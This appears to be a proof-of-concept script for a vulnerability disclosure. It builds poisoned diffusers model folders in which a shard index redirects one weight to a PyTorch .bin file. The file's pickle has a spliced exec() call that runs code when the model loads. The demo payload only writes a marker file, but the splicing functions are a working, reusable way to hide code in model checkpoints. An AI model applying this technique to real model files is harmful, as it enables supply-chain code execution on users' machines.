#!/usr/bin/env python
"""make_poc.py -- build the MEMO model packages used by this PoC.

Product call site under test (memoavatar/memo @ 151b02438f0b, inference.py:143-145):

    reference_net = UNet2DConditionModel.from_pretrained(
        config.model_name_or_path, subfolder="reference_net", use_safetensors=True
    )

Both the vulnerable code and this PoC treat the model root as attacker-authored
data, so the PoC builds three local model roots that differ only in the shard
index -- no code, no plugin, no shell program, no network:

  out/memo_model_index_bin/          POSITIVE: safetensors shard index whose
    reference_net/config.json                  weight_map sends conv_in.weight to
    reference_net/diffusion_pytorch_model.safetensors.index.json
                                               the pickle-backed second_stage.bin
    reference_net/safe.safetensors     all weights, benign safetensors (same bytes
                                       in every arm that has the file)
    reference_net/second_stage.bin     torch.save() shard holding conv_in.weight;
                                       data.pkl executes the payload, then yields
                                       the genuine tensor, so the model still loads
    reference_net/evil_sidecar_probe.py  INERT probe: would drop a marker if any
                                       loader imported it (it never is)

  out/memo_model_index_safe/         NEGATIVE: byte-identical except ONE value --
                                     weight_map["conv_in.weight"] = "safe.safetensors"

  out/memo_model_noindex/            CONTROL: no index file at all; the benign
                                     single-file diffusion_pytorch_model.safetensors
                                     plus the byte-identical poisoned .bin lying next
                                     to it (never reached without the index field)

Usage:
    python make_poc.py            # build the three arms + SHA256SUMS.txt
    python make_poc.py --clean    # remove out/ and the marker files
"""

import hashlib
import json
import os
import pickle
import shutil
import subprocess
import sys
import tempfile
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "out")

POS_PKG = "memo_model_index_bin"
NEG_PKG = "memo_model_index_safe"
CTL_PKG = "memo_model_noindex"
PKGS = [POS_PKG, NEG_PKG, CTL_PKG]

# Fixed diffusers names: use_safetensors=True makes the loader resolve exactly
# this index name (diffusers 0.31.0 model_loading_utils.py:276-281,
# SAFE_WEIGHTS_INDEX_NAME) and exactly this single-file name.
INDEX_NAME = "diffusion_pytorch_model.safetensors.index.json"
SINGLE_FILE_NAME = "diffusion_pytorch_model.safetensors"
SAFE_SHARD = "safe.safetensors"
BIN_SHARD = "second_stage.bin"
SIDECAR = "evil_sidecar_probe.py"

# The one key the positive arm redirects. It exists in every UNet2DConditionModel.
TARGET_KEY = "conv_in.weight"

ARM1_MARKER = os.path.join(OUT, "RCE_MARKER_MEMO_SHARD_INDEX.txt")
ARM3_MARKER = os.path.join(OUT, "RCE_MARKER_SIDECAR_IMPORT.txt")

# Payload executed by torch.load inside the victim process. It reports the PID of
# the process that unpickled the shard, which is the process that called
# from_pretrained() -- i.e. arbitrary code execution in the product process.
PAYLOAD_CODE = (
    "import os, getpass, platform, datetime\n"
    "line = ('ARBITRARY CODE EXECUTED (in-process) pid=%s user=%s host=%s time=%s cwd=%s'\n"
    "        % (os.getpid(), getpass.getuser(), platform.node(),\n"
    "           datetime.datetime.now().isoformat(timespec='seconds'), os.getcwd()))\n"
    "print('[payload] ' + line)\n"
    "open(" + repr(ARM1_MARKER) + ", 'w').write(line + '\\n')\n"
)

SIDECAR_CODE = (
    "# evil_sidecar_probe.py - INERT PROBE. It is never imported by diffusers,\n"
    "# accelerate or the MEMO loader; if it ever were, it would drop the marker\n"
    "# below. Its absence is the disproof of a .py side channel.\n"
    "import os\n"
    "_here = os.path.dirname(os.path.abspath(__file__))\n"
    "open(os.path.join(_here, 'RCE_MARKER_SIDECAR_IMPORT.txt'), 'w').write('imported\\n')\n"
)

# Small, representative UNet2DConditionModel config (the real MEMO reference_net is
# a full SD-style UNet; only the dimensions are shrunk for a CPU box -- the loading
# path under test depends on the file/index layout, not on tensor sizes).
UNET_CONFIG = {
    "_class_name": "UNet2DConditionModel",
    "_diffusers_version": "0.31.0",
    "act_fn": "silu",
    "attention_head_dim": 4,
    "block_out_channels": [32],
    "center_input_sample": False,
    "cross_attention_dim": 8,
    "down_block_types": ["CrossAttnDownBlock2D"],
    "downsample_padding": 1,
    "flip_sin_to_cos": True,
    "freq_shift": 0,
    "in_channels": 4,
    "layers_per_block": 1,
    "mid_block_scale_factor": 1,
    "norm_eps": 1e-05,
    "norm_num_groups": 8,
    "out_channels": 4,
    "sample_size": 8,
    "up_block_types": ["CrossAttnUpBlock2D"],
    "use_linear_projection": False,
}


class _Exec:
    """Pickle reduce stub: calls a callable with one argument when unpickled."""

    def __init__(self, func, arg):
        self.func, self.arg = func, arg

    def __reduce__(self):
        return (self.func, (self.arg,))


def splice_pickle(payload_func, payload_arg, inner_pkl):
    """Prepend one reduce call to an existing pickle stream.

    Byte layout: PROTO2 GLOBAL <func> arg TUPLE REDUCE  ->  POP  ->  inner stream.
    The unpickler runs the call, discards the return value and then yields the
    inner object, so the checkpoint keeps loading as a genuine state dict.
    """
    head = pickle.dumps(_Exec(payload_func, payload_arg), protocol=2)
    assert head.endswith(b"."), "unexpected pickle trailer: %r" % head[-8:]
    return head[:-1] + b"0" + inner_pkl


def poisoned_shard_bytes(state_dict, payload_code):
    """torch.save the genuine state dict, then rewrite data.pkl inside the zip."""
    import torch

    tmp = tempfile.NamedTemporaryFile(suffix=".bin", delete=False)
    tmp.close()
    try:
        torch.save(state_dict, tmp.name, _use_new_zipfile_serialization=True)
        with zipfile.ZipFile(tmp.name) as z:
            members = [(i.filename, z.read(i.filename), i.compress_type) for i in z.infolist()]
    finally:
        os.unlink(tmp.name)

    pkl_names = [n for n, _, _ in members if n.endswith("data.pkl")]
    assert len(pkl_names) == 1, pkl_names
    pkl_name = pkl_names[0]

    out = tempfile.NamedTemporaryFile(suffix=".bin", delete=False)
    out.close()
    try:
        with zipfile.ZipFile(out.name, "w") as z:
            for name, data, ctype in members:
                if name == pkl_name:
                    data = splice_pickle(exec, payload_code, data)
                z.writestr(zipfile.ZipInfo(name), data, ctype)
        with open(out.name, "rb") as f:
            return f.read()
    finally:
        os.unlink(out.name)


def self_test():
    """The spliced shard must (a) still load as a genuine state dict with the
    payload firing and (b) be refused by the guarded loaders that pass
    weights_only=True."""
    import torch

    print("[selftest] splice mechanics with a harmless payload")
    state = {"conv_in.weight": torch.zeros(2, 2)}
    tmp = tempfile.NamedTemporaryFile(suffix=".bin", delete=False)
    tmp.close()
    try:
        with open(tmp.name, "wb") as f:
            f.write(poisoned_shard_bytes(state, "print('[selftest] payload ran')"))
        loaded = torch.load(tmp.name, weights_only=False, map_location="cpu")
        assert isinstance(loaded, dict) and set(loaded) == set(state), loaded
        print("[selftest] weights_only=False -> dict intact, payload ran")
        try:
            torch.load(tmp.name, weights_only=True, map_location="cpu")
        except Exception as e:  # noqa: BLE001 - report whatever the guard says
            print("[selftest] weights_only=True  -> refused: %s: %s" % (type(e).__name__, str(e)[:90]))
        else:
            raise AssertionError("weights_only=True accepted the poisoned shard")
    finally:
        os.unlink(tmp.name)


def build_reference():
    """Create the benign reference UNet in a scratch dir and return its state dict."""
    import torch
    from diffusers import UNet2DConditionModel

    build = os.path.join(OUT, "_build")
    shutil.rmtree(build, ignore_errors=True)
    os.makedirs(build)

    torch.manual_seed(0)
    model = UNet2DConditionModel.from_config(UNET_CONFIG)
    model.save_pretrained(build, safe_serialization=True)
    state_dict = {k: v.detach().clone().contiguous() for k, v in model.state_dict().items()}
    del model
    return state_dict, build


def pack_arms(state_dict, build):
    import json as _json
    import torch
    from safetensors.torch import load_file as st_load
    from safetensors.torch import save_file as st_save

    with open(os.path.join(build, "config.json"), "r", encoding="utf-8") as f:
        ref_config = _json.load(f)

    safe_bytes_path = os.path.join(build, SINGLE_FILE_NAME)
    with open(safe_bytes_path, "rb") as f:
        safe_bytes = f.read()
    assert set(st_load(safe_bytes_path).keys()) == set(state_dict.keys())

    # The poisoned shard declares exactly the one key the index hands it.
    bin_bytes = poisoned_shard_bytes({TARGET_KEY: state_dict[TARGET_KEY]}, PAYLOAD_CODE)
    total_size = int(state_dict[TARGET_KEY].numel() * state_dict[TARGET_KEY].element_size())

    weight_map_safe = {k: SAFE_SHARD for k in state_dict}
    weight_map_pos = dict(weight_map_safe)
    weight_map_pos[TARGET_KEY] = BIN_SHARD

    shutil.rmtree(OUT, ignore_errors=True)
    os.makedirs(OUT)

    for pkg, weight_map, with_index in (
        (POS_PKG, weight_map_pos, True),
        (NEG_PKG, weight_map_safe, True),
        (CTL_PKG, None, False),
    ):
        ref = os.path.join(OUT, pkg, "reference_net")
        os.makedirs(ref)
        with open(os.path.join(ref, "config.json"), "w", encoding="utf-8") as f:
            _json.dump(ref_config, f, indent=2)
            f.write("\n")
        with open(os.path.join(ref, SIDECAR), "w", encoding="utf-8") as f:
            f.write(SIDECAR_CODE)
        with open(os.path.join(ref, BIN_SHARD), "wb") as f:
            f.write(bin_bytes)
        if with_index:
            with open(os.path.join(ref, SAFE_SHARD), "wb") as f:
                f.write(safe_bytes)
            with open(os.path.join(ref, INDEX_NAME), "w", encoding="utf-8") as f:
                _json.dump({"metadata": {"total_size": total_size}, "weight_map": weight_map}, f, indent=2)
                f.write("\n")
        else:
            with open(os.path.join(ref, SINGLE_FILE_NAME), "wb") as f:
                f.write(safe_bytes)
    return state_dict, bin_bytes, safe_bytes


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def assert_single_field_delta():
    """The two indexed arms must be byte-identical except one value in the index."""
    files = {}
    for pkg in (POS_PKG, NEG_PKG):
        files[pkg] = {}
        for root, _dirs, names in os.walk(os.path.join(OUT, pkg)):
            for n in names:
                p = os.path.join(root, n)
                files[pkg][os.path.relpath(p, os.path.join(OUT, pkg))] = sha256(p)
    assert set(files[POS_PKG]) == set(files[NEG_PKG]), "arm file sets differ"
    differing = [rel for rel, h in files[POS_PKG].items() if files[NEG_PKG][rel] != h]
    assert differing == [os.path.join("reference_net", INDEX_NAME)], differing

    with open(os.path.join(OUT, POS_PKG, "reference_net", INDEX_NAME), encoding="utf-8") as f:
        pos = json.load(f)
    with open(os.path.join(OUT, NEG_PKG, "reference_net", INDEX_NAME), encoding="utf-8") as f:
        neg = json.load(f)
    delta = [(k, pos["weight_map"][k], neg["weight_map"][k])
             for k in pos["weight_map"] if pos["weight_map"][k] != neg["weight_map"][k]]
    assert delta == [(TARGET_KEY, BIN_SHARD, SAFE_SHARD)], delta
    assert pos["metadata"] == neg["metadata"]
    print("[assert] the two indexed arms differ in exactly ONE value:")
    print("         weight_map[%r]: %r (positive) vs %r (negative)" % delta[0])
    print("[assert] safe.safetensors, second_stage.bin, config.json and the inert sidecar "
          "are byte-identical in both arms")


def write_sums():
    lines = []
    for pkg in PKGS:
        pdir = os.path.join(OUT, pkg)
        for root, _dirs, names in os.walk(pdir):
            for n in sorted(names):
                p = os.path.join(root, n)
                lines.append("%s  %s" % (sha256(p), os.path.relpath(p, HERE)))
    for extra in ("make_poc.py", "run_poc.py", "Dockerfile"):
        p = os.path.join(HERE, extra)
        if os.path.exists(p):
            lines.append("%s  %s" % (sha256(p), extra))
    with open(os.path.join(HERE, "SHA256SUMS.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    return lines


def clean():
    shutil.rmtree(OUT, ignore_errors=True)
    for p in (os.path.join(HERE, "SHA256SUMS.txt"),):
        if os.path.exists(p):
            os.unlink(p)
    print("cleaned")


def main():
    if "--clean" in sys.argv:
        clean()
        return

    import torch
    import accelerate
    import diffusers

    print("[0/5] victim process pid=%d" % os.getpid())
    print("      python %s | torch %s | diffusers %s | accelerate %s"
          % (sys.version.split()[0], torch.__version__, diffusers.__version__, accelerate.__version__))

    print("[1/5] building the benign reference UNet2DConditionModel (tiny, CPU)")
    state_dict, build = build_reference()
    print("      reference state dict: %d tensors, %d bytes"
          % (len(state_dict), sum(v.numel() * v.element_size() for v in state_dict.values())))

    print("[2/5] self-test of the poisoned shard (functional dict + guarded refusal)")
    self_test()

    print("[3/5] packing the three model roots")
    pack_arms(state_dict, build)
    for pkg in PKGS:
        ref = os.path.join(OUT, pkg, "reference_net")
        print("      %-22s %s" % (pkg, ", ".join(sorted(os.listdir(ref)))))

    print("[4/5] asserting the two indexed arms differ in exactly one index value")
    assert_single_field_delta()

    print("[5/5] writing SHA256SUMS.txt")
    lines = write_sums()
    print("      %d file hashes recorded" % len(lines))
    print()
    print("positive arm  %s/reference_net/%s" % (POS_PKG, INDEX_NAME))
    print("              -> weight_map[%r] = %r   (pickle shard, payload spliced into data.pkl)" % (TARGET_KEY, BIN_SHARD))
    print("negative arm  %s  -> same bytes, weight_map[%r] = %r" % (NEG_PKG, TARGET_KEY, SAFE_SHARD))
    print("control arm   %s  -> no index at all; the same poisoned %s is never reached" % (CTL_PKG, BIN_SHARD))


if __name__ == "__main__":
    main()
